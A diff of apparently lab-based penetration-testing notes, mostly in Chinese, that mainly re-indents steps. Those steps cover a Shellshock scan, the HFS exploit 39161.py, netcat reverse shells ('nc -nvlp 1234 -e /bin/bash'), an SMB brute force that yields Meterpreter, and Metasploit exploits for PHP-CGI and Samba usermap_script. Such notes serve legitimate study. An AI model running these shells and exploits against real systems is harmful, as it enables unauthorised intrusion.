@@ -16,11 +16,11 @@
 	ifconfig (192.195.70.2)
 	nmap -sV -O 192.195.70.3
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	/gettime.cgi
 	 CGI 腳本是在 Web 伺服器上執行的腳本，能夠執行系統級命令並在 Web 伺服器上顯示輸出
+  	/gettime.cgi
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	 使用Nmap執行ShellShock漏洞掃描: 
-	 nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.195.70.3
+	使用Nmap執行ShellShock漏洞掃描: 
+	nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.195.70.3
 	 
 		 80/tcp open  http    Apache httpd 2.4.6 ((Unix))
 		| http-shellshock: 
@@ -45,13 +45,13 @@
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	searchsploit HTTP File Server 2.3
 		Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)             | windows/remote/39161.py
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	searchsploit -m 39161
-		Copied to: /root/39161.py
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	nano 39161.py
-		ip_addr = "10.10.38.3"
-		local_port = "1234"
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		searchsploit -m 39161
+			Copied to: /root/39161.py
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		nano 39161.py
+			ip_addr = "10.10.38.3"
+			local_port = "1234"
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	將 nc.exe 可執行檔複製到桌面: 
 		cd Desktop 
@@ -84,8 +84,8 @@
 		nc -nv 10.0.24.195 21
 		(UNKNOWN) [10.0.24.195] 21 (ftp) : Connection refused
 
-	連線被拒絕。這並不一定意味著連接埠已關閉
-	意味著對該連接埠的存取被防火牆阻止或過濾
+		連線被拒絕。這並不一定意味著連接埠已關閉
+		意味著對該連接埠的存取被防火牆阻止或過濾
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	連接 UDP 連接埠: 
 		nc -nvu 10.0.24.195 161
@@ -132,9 +132,9 @@
 		C:\Users\Administrator\Desktop>
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
 	windows to kali : 
-	nc -nvlp 1234 -e /bin/bash
-	cmd : nc.exe -nv 10.10.38.2 1234
-	ls	
+		nc -nvlp 1234 -e /bin/bash
+		cmd : nc.exe -nv 10.10.38.2 1234
+		ls	
 ## Reverse Shells
 	=> 使用 Netcat 設定反向 shell
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -175,8 +175,8 @@
 		8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.0
 		8181/tcp  open  ssl/http             Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
 		9200/tcp  open  wap-wsp?
-	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
-
+		Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -T4 -PA -sC -sV -p 1-10000 demo.ine.local
 		8484/tcp open  http                 Jetty winstone-2.8
 		8585/tcp open  http                 Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)
@@ -191,21 +191,22 @@
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	SMB 枚舉 : 
 		鑑於目標系統運行的是 Windows，我們可以在 SMB 連接埠 (445) 上執行枚舉
-	nmap -sV -sC -p 445 demo.ine.local
-		=> 電腦主機名稱和 NetBIOS 名稱
-		=> NetBIOS computer name: VAGRANT-2008R2\x00
-		=> OS: Windows Server 2008 R2
+  
+		nmap -sV -sC -p 445 demo.ine.local
+			=> 電腦主機名稱和 NetBIOS 名稱
+			=> NetBIOS computer name: VAGRANT-2008R2\x00
+			=> OS: Windows Server 2008 R2
+	
+		msfconsole -q 
+			use /auxiliary/scanner/smb/smb_version
+			set RHOSTS demo.ine.local
+			run
 
-	msfconsole -q 
-		use /auxiliary/scanner/smb/smb_version
-		set RHOSTS demo.ine.local
-		run
-
-	[+] 10.0.20.126:445       -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:24m 13s) (guid:{10bbd714-905b-44e8-8eee-c3147ad0c190}) (authentication domain:VAGRANT-2008R2)Windows 2008 R2 Standard SP1 (build:7601) (name:VAGRANT-2008R2)
-
-	[+] 10.0.20.126:445       - 10.0.20.126:445 - Success: '.\administrator:vagrant' Administrator
-
-	[*] Meterpreter session 1 opened (10.10.38.6:4444 -> 10.0.20.126:49550) at 2025-01-16 16:59:30 +0530
+		[+] 10.0.20.126:445       -   Host is running SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:24m 13s) (guid:{10bbd714-905b-44e8-8eee-c3147ad0c190}) (authentication domain:VAGRANT-2008R2)Windows 2008 R2 Standard SP1 (build:7601) (name:VAGRANT-2008R2)
+	
+		[+] 10.0.20.126:445       - 10.0.20.126:445 - Success: '.\administrator:vagrant' Administrator
+	
+		[*] Meterpreter session 1 opened (10.10.38.6:4444 -> 10.0.20.126:49550) at 2025-01-16 16:59:30 +0530
 ## Targeting Microsoft IIS FTP
 	=> 識別薄弱配置、測試匿名存取以及進行暴力攻擊以獲得未經授權的存取和操縱 Web 伺服器內容
 
@@ -364,7 +365,6 @@
 	ftp demo.ine.local 21
 	=> 利用此存取權限上傳反向 shell 負載，以獲得對目標系統的存取權限
 ## Targeting PHP
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC -p 80 demo.ine.local
 		80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -374,12 +374,12 @@
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	searchsploit php cgi
 		PHP 5.3.12/5.4.2 - CGI Argument Injection (Metasploit)                          | php/remote/18834.rb
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	msfconsole -q 
-		use exploit/multi/http/php_cgi_arg_injection
-		set RHOSTS demo.ine.local
-		run
-		meterpreter > 
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		msfconsole -q 
+			use exploit/multi/http/php_cgi_arg_injection
+			set RHOSTS demo.ine.local
+			run
+			meterpreter > 
 ## Targeting SAMBA
 	=> Samba 是一個開源軟體套件，可為 SMB/CIFS 用戶端提供無縫文件和列印服務
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -396,11 +396,11 @@
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	searchsploit samba 3.0.20
 		Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit | unix/remote/16320.rb
-	
-	search samba Command Execution 
-		use exploit/multi/samba/usermap_script
-		set RHOSTS demo.ine.local
-		exploit
+		~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		search samba Command Execution 
+			use exploit/multi/samba/usermap_script
+			set RHOSTS demo.ine.local
+			exploit
 	
 	[*] Command shell session 1 opened (10.10.38.2:4444 -> 10.0.27.139:42372) 
 
